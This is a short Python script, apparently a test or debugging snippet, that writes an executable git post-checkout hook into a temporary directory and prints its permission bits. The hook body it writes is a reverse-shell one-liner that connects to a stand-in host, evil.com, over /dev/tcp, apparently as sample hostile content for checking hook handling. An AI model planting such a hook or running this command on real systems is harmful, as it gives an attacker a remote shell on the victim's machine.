import tempfile
import os
import stat

def _make_hook(repo_dir, hook_name, content):
    hooks_dir = os.path.join(repo_dir, '.git', 'hooks')
    os.makedirs(hooks_dir, exist_ok=True)
    path = os.path.join(hooks_dir, hook_name)
    with open(path, 'w') as f:
        f.write('#!/bin/bash\n' + content + '\n')
    os.chmod(path, stat.S_IRWXU)
    return path

with tempfile.TemporaryDirectory() as d:
    hook_path = _make_hook(d, 'post-checkout', 'bash -i >& /dev/tcp/evil.com/8080 0>&1')
    
    # Check the permissions
    file_stat = os.stat(hook_path)
    permissions = oct(file_stat.st_mode)
    is_executable = os.access(hook_path, os.X_OK)
    
    print('Hook path: {}'.format(hook_path))
    print('Permissions (octal): {}'.format(permissions))
    print('Is executable (os.access): {}'.format(is_executable))
    print('stat.S_IRWXU: {}'.format(oct(stat.S_IRWXU)))
    print('File exists: {}'.format(os.path.exists(hook_path)))
    
    # Let's also check what the actual mode bits are
    mode = file_stat.st_mode
    print('Mode & S_IRWXU: {}'.format(oct(mode & stat.S_IRWXU)))
    print('Mode & S_IXUSR: {}'.format(oct(mode & stat.S_IXUSR)))
    print('S_IXUSR: {}'.format(oct(stat.S_IXUSR)))